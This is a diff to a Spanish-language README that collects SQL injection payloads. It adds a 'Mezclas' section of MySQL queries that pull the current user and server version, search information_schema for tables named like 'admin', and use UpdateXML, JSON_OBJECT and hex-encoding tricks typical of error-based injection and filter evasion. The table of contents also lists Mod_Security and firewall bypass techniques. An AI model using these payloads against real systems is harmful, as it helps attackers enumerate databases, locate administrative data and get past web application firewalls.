@@ -61,6 +61,7 @@ La mayoria de los payloads aquí mostrados estan creados o modificados por mi.
         * [Sql inyection payload usando extractvalue](#Sql-inyection-payload-usando-extractvalue)
         * [Sql inyection payload + url encode + timing](#Sql-inyection-payload-+-url-encode-+-timing)
         * [JSON Generation Functions](#JSON-Generation-Functions)
+        * [Mezclas](#Mezclas)
     * [Sql inyection + dios sql](#Sql-inyection-+-dios-sql)
     * [Sql inyection Buffer Overflow / Firewall Crash bypass + xss inyection](#Sql-inyection-Buffer-Overflow-/-Firewall-Crash-bypass-+-xss-inyection)
     * [sql inyection payload+ bypass Mod_Security](#sql-inyection-payload+-bypass-Mod_Security)
@@ -983,7 +984,36 @@ select json_arrayagg('_Y000!_')
 
 ```
 
+## Mezclas
 
+```
+select json_arrayagg(concat(JSON_OBJECT(concat(JSON_OBJECT(concat(current_user()), concat(@@version))), '_Y000!_')))
+
+SELECT * FROM  information_schema.tables WHERE `table_name` REGEXP 'admin'
+
+SELECT IF(IFNULL(1/0,'a'),'NO',JSON_OBJECT(1, concat(table_name))) FROM  information_schema.tables WHERE `table_name` REGEXP 'admin'
+
+select UPDATEXML(1,CONCAT('.',1,(SELECT (ELT(1=1,2))),3),1)
+
+select UNHEX(HEX(lpad(table_name,50,'>'))) from information_schema.tables
+
+SELECT TRIM(UpdateXML(table_name, '_Y000_', '1111')) FROM information_schema.tables
+
+select IF(IFNULL(0,'a'),'NO es nulo',JSON_OBJECT(1, concat(table_name))) FROM  information_schema.tables
+
+Select if(substring(@@version,'1','1') = "5", 'si', 'no')
+
+Select Unhex(hex(WEIGHT_STRING(table_name))) as 'tables' from information_schema.tables where table_name regexp '^[a | b]'
+
+select UNHEX(HEX(lpad(table_name,50,'>'))) from information_schema.tables
+
+select UPDATEXML(1,CONCAT('.',1,(SELECT (ELT(1=1,2))),3),1)
+
+SELECT TRIM(UpdateXML(table_name, '_Y000_', '1111')) FROM information_schema.tables
+
+
+
+```
 
 ## Sql inyection + dios sql
 
